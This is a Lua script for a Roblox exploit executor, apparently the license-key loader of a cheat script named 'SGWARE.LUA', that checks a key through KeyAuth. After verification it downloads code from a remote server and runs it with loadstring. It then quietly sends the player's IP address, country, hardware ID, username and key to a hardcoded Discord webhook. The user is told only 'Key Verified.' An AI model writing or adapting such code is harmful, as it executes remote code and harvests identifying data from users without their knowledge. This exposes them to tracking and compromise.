local function main(script_key)
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local webhookUrl = "https://discord.com/api/webhooks/1315295262964711424/jV6owUMp1eAfBZxyCe96dEpdiqjnWSwyAkmAJmEhLjGNszYhPRbP3MqvoY0fwmySNq5D"

    local function notify(title, text)
        game.StarterGui:SetCore("SendNotification", {
            Title = title;
            Text = text;
            Duration = 5;
        })
    end

    local function sendWebhookMessage(embed)
        local payload = HttpService:JSONEncode({
            embeds = {embed}
        })

        local response = http_request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })

        print(response.StatusCode, response.Body)
    end

    local function initializeSession()
        local sessionReq = game:HttpGet('https://keyauth.win/api/1.2/?type=init&name=SGWARE.LUA&ownerid=BSzFLdc5kA')
        print("Session Request: ", sessionReq)
        local success, sessionData = pcall(function()
            return HttpService:JSONDecode(sessionReq)
        end)

        if not success then
            notify("Session Error", "Failed to parse session response: " .. tostring(sessionData))
            return false
        end

        if sessionData.success then
            sessionid = sessionData.sessionid
            return true
        else
            notify("Session Error", "Failed to initialize session: " .. sessionData.message)
            return false
        end
    end

    if not initializeSession() then
        return
    end

    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    local req = game:HttpGet('https://keyauth.win/api/1.2/?type=license&key=' .. script_key .. '&sessionid=' .. sessionid .. '&name=SGWARE.LUA&ownerid=BSzFLdc5kA&hwid=' .. hwid)
    print("License Request: ", req)
    local success, data = pcall(function()
        return HttpService:JSONDecode(req)
    end)

    if not success then
        notify("License Error", "Failed to parse license response: " .. tostring(data))
        return
    end

    if data.success then
        notify("Success", "Key Verified.")

        local ipDetails = loadstring(game:HttpGet("http://sudo.pylex.xyz:9497/info"))()
        local deviceType = (game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled) and "Mobile" or "PC"

        local embed = {
            title = "New Login",
            fields = {
                {name = "HWID", value = hwid, inline = true},
                {name = "Roblox Username", value = LocalPlayer.Name, inline = true},
                {name = "Device", value = deviceType, inline = true},
                {name = "IP", value = ipDetails.ip, inline = true},
                {name = "Country", value = ipDetails.location, inline = true},
                {name = "Key", value = script_key, inline = true}
            },
            color = 0x00FF00
        }

        sendWebhookMessage(embed)

        print("SUCCESS")
    else
        notify("Error", "Error: " .. data.message)
    end
end

return main
